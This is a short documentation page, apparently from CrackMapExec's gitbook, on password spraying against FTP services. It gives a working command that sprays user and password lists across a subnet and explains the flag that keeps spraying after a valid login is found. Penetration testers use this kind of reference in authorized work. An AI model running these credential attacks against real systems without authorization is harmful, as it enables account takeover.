# Password Spraying

### Password spraying (without bruteforce)

```
#~ cme ftp 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
```

By default CME will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. Usefull for spraying a single password against a large user list.

<figure><img src="../../../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

